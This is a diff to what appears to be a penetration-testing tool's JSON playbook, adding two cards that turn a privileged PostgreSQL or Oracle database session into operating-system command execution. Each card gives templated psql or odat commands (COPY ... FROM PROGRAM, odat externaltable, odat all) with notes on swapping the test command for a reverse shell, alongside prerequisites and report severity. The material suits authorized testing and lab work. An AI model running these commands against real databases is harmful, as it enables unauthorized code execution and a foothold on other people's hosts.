@@ -190,6 +190,50 @@
       ]
     },
     {
+      "id": "postgres-rce",
+      "title": "PostgreSQL to Command Execution",
+      "hypothesis": "A PostgreSQL session with a superuser role is a shell: COPY ... FROM PROGRAM runs an OS command and reads its output straight back into a table (9.3+), and older builds reach the same end through an untrusted PL/language or a large-object write. The DB becomes your foothold as the postgres service account.",
+      "tool": "psql",
+      "tools": [
+        "psql"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "requires_any": [
+        "service.postgresql",
+        "port:5432"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 70,
+      "proves": "OS command execution through the PostgreSQL session — a foothold as the DB service account",
+      "does_not_prove": "a non-superuser session can run COPY FROM PROGRAM; that needs the pg_execute_server_program role or superuser",
+      "report": {
+        "finding": "Remote Code Execution via PostgreSQL",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql"
+      ],
+      "commands": [
+        {
+          "tool": "psql",
+          "run": "psql -h {{target}} -U {{user}} -c \"COPY (SELECT '') TO PROGRAM 'id'\"",
+          "note": "The quick proof: TO PROGRAM runs the command (output goes to the server's stdout/logs)."
+        },
+        {
+          "tool": "psql",
+          "run": "psql -h {{target}} -U {{user}} -c \"DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;\"",
+          "note": "The readable form: FROM PROGRAM captures command output into a table you then SELECT. `uid=...` is your foothold; swap id for a reverse shell and catch it with the listener card."
+        }
+      ]
+    },
+    {
       "id": "redis-enum",
       "title": "Redis Unauthenticated Enumeration",
       "hypothesis": "A Redis exposed on a lab or the internet frequently has no AUTH set; INFO and KEYS surface cached secrets, and a writable instance can be pushed toward RCE by writing an SSH key or a webshell.",
@@ -328,6 +372,51 @@
           "tool": "sqlplus",
           "run": "sqlplus {{user}}/{{password}}@{{target}}:1521/{{sid}}",
           "note": "Log in with a found credential; from a privileged account odat utlfile/externaltable then reads, writes, and runs code."
+        }
+      ]
+    },
+    {
+      "id": "oracle-rce",
+      "title": "Oracle to Command Execution",
+      "hypothesis": "A privileged Oracle session reaches the OS: odat automates the known paths — an external table that runs a command, a Java stored procedure, or the scheduler (DBMS_SCHEDULER) — turning a database login into code execution on the host. ODAT bundles them so you do not hand-write the PL/SQL.",
+      "tool": "odat",
+      "tools": [
+        "odat",
+        "sqlplus"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "db.session"
+      ],
+      "requires_any": [
+        "port:1521",
+        "service.oracle-tns"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 68,
+      "proves": "OS command execution through the Oracle session — a foothold as the Oracle service account",
+      "does_not_prove": "that every account can; the external-table/Java/scheduler paths need the matching privileges (often DBA)",
+      "report": {
+        "finding": "Remote Code Execution via Oracle Database",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/quentinhardy/odat"
+      ],
+      "commands": [
+        {
+          "tool": "odat",
+          "run": "odat externaltable -s {{target}} -d {{sid}} -U {{user}} -P {{password}} --getecho --command \"id\"",
+          "note": "The external-table path: run a command and read its echo. `uid=...` confirms the foothold; swap in a reverse shell and catch it."
+        },
+        {
+          "tool": "odat",
+          "run": "odat all -s {{target}} -d {{sid}} -U {{user}} -P {{password}}",
+          "note": "Let odat probe every RCE and file path your account can reach, then use the one it reports as exploitable."
         }
       ]
     },
